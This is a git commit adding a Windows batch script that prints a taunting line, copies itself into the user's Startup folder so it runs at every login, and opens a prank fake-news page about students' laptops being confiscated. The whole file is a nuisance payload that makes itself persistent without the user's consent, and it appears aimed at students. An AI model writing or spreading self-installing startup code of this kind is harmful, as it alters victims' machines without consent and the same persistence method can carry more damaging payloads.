70f0b66cf4907257918785ca2f574e5cc6d5e2e3
Repiked <52291608+Repiked@users.noreply.github.com>
2022-11-28 16:21:50 -0600

    Add files via upload

---
+++ script.bat
@@ -0,0 +1,13 @@
+@echo off
+for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A
+:::  this is what you deserve for our suffering
+
+
+if exist "%userprofile%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/%~n0%~x0" (
+start "" https://www.latlmes.com/breaking/sem-plans-to-confiscate-students-laptops-1
+
+) else (
+copy /y %~f0 "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
+start "" https://www.latlmes.com/breaking/sem-plans-to-confiscate-students-laptops-1
+)
+cls
